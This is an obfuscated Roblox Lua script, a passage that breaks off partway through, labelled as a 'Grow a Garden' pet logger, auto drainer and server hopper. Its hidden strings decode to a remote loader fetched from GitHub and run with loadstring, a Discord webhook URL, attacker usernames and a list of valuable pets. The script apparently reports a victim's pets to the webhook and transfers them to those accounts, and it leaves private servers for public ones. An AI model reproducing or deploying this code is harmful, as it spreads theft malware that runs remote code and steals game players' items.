local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- ✅ Grow a Garden Pet Logger + Auto Drainer + Server Hopper

-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('PkwdGbSYXguDvIPHyOvJGsTFrNcxlztrorcDEsWlrspCBcUYLdUhcvJaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('EDbKphEnRrviYtUWVmjgrDVwHFdjiGyQUDGcbJYsotANaQBfxXokdFkaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('AoMJwuoszmZkZrtIbqLsZGEJTDlhHapaTuQwIVFSCTbPlgmaxUIqOLsQmFkUGxheWVyMTIz'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('VsuaghjaeTgJGLqVWKzRdYDVePSINtvbzEOxwpMjBUIFvKknOzXtHVGTXlBbHQ='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('vPRJBxLVIdihLrEkzIBbLcDWxciIqgcqOxYCxjchtLcPjctzPwlmzvVRW5lbXlHdXk=')}
local drainPets = {
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('lHavbqkuWyNpzFjzvtQOrtSbfanIXWvyodgzkosRXQItxBAyxuxLDFNRHJhZ29uZmx5'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('cZZzzjxizsQEsCVCdtxHcwJCVvXdbNzlpVdwvsIjudaxOMPEECaXubpVOKAkVJleA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('drVKOCntsSFDZivtTaYPitSnvxKoqIJlMGeBdTkozumFPJZKohKRGMTUmFjY29vbg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('DKIqBxDCikNUCDoMbNwWsbyUhiVvUaVQwgPnIbNZYYXzyCVvAJepCoPUmVkIEZveA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('LYLEoduyhFdeqdWlrjNkuthoHnEHVsYWsQnunnofSGulBrlfKnIVOBjUXVlZW4gQmVl'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('nEoYihijNUONuEiPYWlLuaQVOSxjkZcsAiNZaBNjaqyhpQGeEdxMDNpRGlzY28gQmVl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('NbClhJWGvWfFTpRfIOYaEAFXjfBkfPKrTnoShEqtJzMMJTBPzcSpmNHQnV0dGVyZmx5'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('xYuaJItuklNglSzCHeMZefxpORdqFCfibrvnSAzMZAgIRQikAnCSkfwTWltaWM='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('bTjQwPrUmaeGKbsUoxkDZcWzPSEQhjqtjKOJljsMBvMARpthZPUchHFTW9vbiBDYXQ='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('wmCuzFJhOSENnucQMOvjUhdqHjhHJJGOGbBXwqJHGgdgQQsFQAzbyxbRmVubmVjIEZveA=='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('zGlNuIUEDdSaGTvidPvVkGSgGaaIPYWTZLHfcwxBWAltMmBuOfpEiZCVHJpY2VyYXRvcHM=')
}
local petKeywords = {
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('FxgzdLzMZzplOHekujfQoNoqUYlGUWqAlrrOXplmiuLRCvESSgSiPmUU3RhcmZpc2g='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('wkzIKzTsEEiYIHCEaHaHyVFayUTIUchqAWtxfPpHYcEeWKGkcAnpwVXQ3JhYg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('IhgwxsvzymaInNkvIkAuvHZiElswlolFpsUgApRtUDDLipVtGVubuYkU2VhZ3VsbA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('hpOUweuwMgvuoulMdjBQgSOTdzVGXuevwsSiauzChWSoAapYViewSHtQnVubnk='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('lkXUeNgOpBvbqjpYuOJIbKgcKSDJYOZViNkkPsMFaFubBjxKXBlXYzHRG9n'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('nVbyNjgzzHndLFHXOvSuyCRvIkEMlPWsOctLtzMpoKNyafIxeWdvtVlR29sZGVuIExhYg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('DhFYfVKUxEuVGYPRWEncGhQQrROVQenROvgoVoelMOolTINSvNzijXFQmVl'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('SOtXQNhxEvVjWlgwtUhTXCtrHjDwvODWSTkXJsDTHcYDCIPgvRPijEJQmxhY2sgQnVubnk='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('wbtfgWDNVeJeOZCDRhUClxkSiTJNoStUJXTABZeMWqLUXlQrIHQQatRQ2F0'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('ndNxlPAAyUlshzZCPIFYkEDbnYdaTegBlIsPivynDJfOzBvDIjmBSngQ2hpY2tlbg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('MURlPLPGMzlcqbKlmjKCRppYWhSrDkiyeyhpVIbinLwcxoeQNYlmtITRGVlcg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('gXBmpMtoZgsPBJyPZBTZnfZcJTBbfPtkLxzvOMtrAJkmSeBFpCDgRQpTW9ua2V5'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('jqEuyaRHZFWgmUrpmXfdevNMLqXrVKvFqfrIlXZkTprZronYTccPtweT3JhbmdlIFRhYmJ5'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('slbcQpanVKupygEvUwaaCTjoKLlHAbOTgyrYkohmyqIcqbxaFzpXykuUGln'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('SbRlYkpEkfDnFoJQzPZCOTvhmUdQqSyUvbtlAwUWjnzVFpZfIyAOOgzUm9vc3Rlcg=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('LCRcIcgJQmQFCvqnALEGfbKxUhqgIpMRdlNvvsounWrydKiycBanbSrU3BvdHRlZCBEZWVy'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('KuQalXoaiefKxLWZWIFfhVLCrdcBhPfvXAJmtnDBeQUgHmLyQLAVBlIRmxhbWluZ28='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('qyFUxoUyszreRPaGAzawAQTBgZLDnoJypZZNJGegroAvogLqlcdlMptVG91Y2Fu'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('xTHGaCXOSVDAQNRhzYPPXLmPQtrAQUIdTvPlkwUODpUpTOmDkTVljvZU2VhIFR1cnRsZQ=='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('qdkYFonBuFrGkGdJcCWqbpxbPqVPeuTKEnXFNDpnJTHjfUKhlFbBQSyT3Jhbmd1dGFu'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('AckprZFKiusVCBNEXoEOCuEXWbKIZHhAWJmtrDrxfBcNREvEQgryEplU2VhbA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('mEkNomzcwYBtRfFvywRQfPBtgepyirFrRecNRMqIUiDtkDZbKvYtTrYSG9uZXkgQmVl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('rabVJtFFzrdHfwXcHdlKaDDWvFNOkhmXzJhaGObyKHuGBESHMfjEjTZV2FzcA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('uFgxfEmvCMOoFFVDHCaOYaxOOQrlskJOjLoBnKYaMxCIHjKEruubxoZVGFyYW50dWxhIEhhd2s='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('ovHmFNoocjVUZDhQxorMHxclJcwuDnoVgybzFElkRcKlJgvlGcnnkCzUmFwdG9y'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('nGOfLAXyyuPwQOsqzFmBCoxcFctPMfjBgkVXlTvPxTYKmaUEaiwQHEfVHJpY2VyYXRvcHM='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('CjxUcavJyaPtNloEyGROTmMbiTThmywTufNfHlAQIzzIdbeeaDIwSTRU3RlZ29zYXVydXM='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('gtwquwiOVsLuSHLrQZpOrVQwUCFtqHqoMEpitwOHUHgHraLeQsFzlZaUHRlcm9kYWN0eWw='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('bQSZVDBVnNlRzAnWfSroENlMSWWAQppwIvtKazrfTJYgYlvnmToAJYQVHVydGxl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('SOodBvMRyTwAxJUhmAQuYhLXMjrozrbfXKbMvrPkzlngnOEJEhEhpyeQ2F0ZXJwaWxsYXI='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('lKRmjYBGBqZgEtDnfBOmXJwNTEbOEFGliqdSJVwFxYJKcGOcRBoJwMJUGV0YWwgQmVl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('WkYtEYOnmupMbfpdbOsESrmSHwkVubqmujIVnVlQzyiUSpxyRKNKBHoTW90aA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('IDNixkcGCBcVhejCNXqNnUzTRxfGGitDqMlpktLorgNzqLhneaDJGdDU2NhcmxldCBNYWNhdw=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('zAJDAlXzppzScgCsIJdGEgXOuZDKywkbQJnFkmJKBBQNGtmMYqmzqYtT3N0cmljaA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('MGbEVoDkUkHmiQpbomDNFKDFuLBSOhUKRzlpeunOHqCCropTJPTEMZSUGVhY29jaw=='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('IRPSBWWGUmdJuoJvvPCURRIKVLEjmkXfpRMnWxIZYoRHgvJOHWOrEjOQ2FweWJhcmE='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('MVVgTRjqjZOuZpxKOdzcPgXLSWDFMtLLjbfJXcuzeBWNEqmDWiSYSUhU2FuZCBTbmFrZQ=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('cBYzWjxfjpuFxXuhWUgnzpKInhgQWDYQDnZRpIipbGlpHhXROPkbRfkTWVlcmthdA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('WhDQEiuNDZCTorKsOffYVkARQWBZALEpIdMxlKDxHjlruxtbsmysEgGQnJvd24gTW91c2U='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('ntdvqBctDduBoqsRkSWVHZqQZJTkDKGLTgXoBAaUFUmNTjqfQiTONDPR2lhbnQgQW50'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('dClzpLlkVcFqcQzWohNuMGJeukAyyXFRiEzLeLlgTvlfzzEUJaPsFtRR3JleSBNb3VzZQ=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('LLHeyHftolDuwbZHtaTSQKdAupoHfAcZDOAURbTmDtrEFCxNmyqpOPVUHJheWluZyBNYW50aXM='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('TxCweTAUviMmEqUaWRcBQgeGmPKxTZjpikHNFplQUqgRsYLSCoyDtdiUmVkIEdpYW50IEFudA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('OuXyJABQyXtCxHjkRNikHBvvOrDXZPBQxBNgeNrNypQieHmUUQZSNEDU25haWw='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('tZjAuXoCQvMmGpcYLpESnBVYFyrHAmiPQiPabJyMKBexRcHRlkBGXnwU3F1aXJyZWw='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('GcPiThUvjRPRQsdoPRyaIWqLCOQqgGOODYRsrXiAJaAdrDgUlvIyXaIQmVhciBCZWU='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('GrLIMfNVIcsHUkhnALQgfTRawTlsaZXlbHRoIdWiCRENkvpWCajrAvuQnV0dGVyZmx5'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('thZeGKFXVjjNMSBmzCtgUMbgixTDeIYBVpiHAQJrQgfhSwHgkltrOcfQnJvbnRvc2F1cnVz'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('uTrEfQEzYTIMcOmaSnQJAygSEfigfHHUABnAsAFFqOiZxLFVsJJvhugUGFjayBCZWU='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('MpofYsbcNFQdDGqCirfGGjRTmGJMtXdOFJhiWauztBOhxVtgFmwigiETWltaWMgT2N0b3B1cw=='),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('TMhCjEOgvvgpWVjHGLpQVoBJZkquPqbsJOeWjwiPYrcRNebvDrRnIpFSHlhY2ludGggTWFjYXc='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('LcqyShLJPtaYWjzXVRWqHgYMYZmdGneWXtcJMHKTzQwkYUWxondblzxQXhvbG90bA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('mILsuFxEekLauYzpRyTOLNBFJcmxKgzXgwEElUHxgUWLKdnETHwoShCUmVkIEZveA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('rRhehYhHBDNxtPuKKGvmCBTafjiECArWNcxEwjOIgBsfepsLvgLsQDPVOKAkVJleA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('uQBXllyJYvcZElYHDmzuHlfrfeSkwDuNlBdSEGQbdFvjrZIihGZLbPdRHJhZ29uZmx5'),
    lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('lGIcCVnWqKTKNPCtNhXCRAqOIqjrnhkEXDtjBLJMVkWqcOXDyIuSajRUXVlZW4gQmVl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('TnedUFxutRLYiLJyLInnrzWvPrDLmUTeimMDFaGZvEtUoQIfMhRbKOIRGlzY28gQmVl'), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('dVzVDihomGDSHvZwgFQvHKRZlsPuGwHNqEcgyKXHKdeeOrwwFhwnpDPRmVubmVjIEZveA=='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('HIfUgDpfuIyPJqfzCynKLZALTKwGHBGFdoZPeFDYSgnjiyTDMXqsaXSTW9vbiBDYXQ='), lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('xXtBnuGioLRqsVbUOddApzRACuhJuShdwXnKhIkUoiwwWNQhxlxJDoBUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('AIVKvUrVOjXJfRjrVONfTyOwsDeaeKwvvgDkTSGrxgoiZoIVWHjQRKMUGxheWVycw=='))
local ReplicatedStorage = game:GetService(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('uWWhPQpkOgTuMMvIysrYttuleFercwzpsURbHvnRdFGbMgWYcmxuoSXUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('wOWEdmeuQdqggQcYgJmFuvVZQrDVdRsnBhhdxMaKOxDuksHwbihlwBfSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('UDpizPXbrgNcPHQXPcJTUBnwmYzSJxsvVzMMHBzFsTUzXDusVRohbfDVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('BngJcYYsuzsGOchOZydEMchPBUSaKvlhMUONpIMdfUzNZZGrwFYwgHMTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('vwpdeRMMtNbgjiJVIEHzjGvphpgubcvIZVHxotacADIbsVglzpBPRoQQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('EnKxqkHlQleImvrGRhEeDBrsrtuBiRCmCVWcvyMtZPQONQEYozLenuo')
    local lowest = nil
    repeat
        local url = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('CeAxGvsJXbLxiHpOrxnItEMKyXrxgNpsjdHCcccLYBZZfPyfEHFZUynaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('WJKPVhGbqnReWcYWOneGKliKaPBkjyeWfEwaiUwaedowhPVpKlZWOZiL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('nIOGfCwrnwkdTeyreTWueoiwaqyogjBQuMpIAcdwbLLcZVtbOokmiGH') then url = url .. lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('KnHdCpRNXUgktlCHLWNqBVwshKbzWUCpCyodpmGFQTExKbTEYztxvjJJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('gFSfQbGqGtXghmUfyamHnkjrxLDKhaLOUkjPgOjgOUOazssDxQkjWVFR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('gfUIXETqfEfObPDXmOYFmdnbHdwjUtADluXiFogteBVqicNhXiTlCbX') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('oBjjJyICaexoaIuWDbAPJsuafFZClZsYbrIKktJfbJFladreWPttPIkWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(lcRkvFwenxiImDECdfcuRUWsNodFlqbiJZOhfOaPuocvaRuEoSOlEIZSWopvIgRqrEpFtEmSxRjRcjQFEyiMRGg('IkzhaLmnozYGRCMFRITcdqOEgOtHvAGmPUvYlCusFUNTuvxLbMVxaZnWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
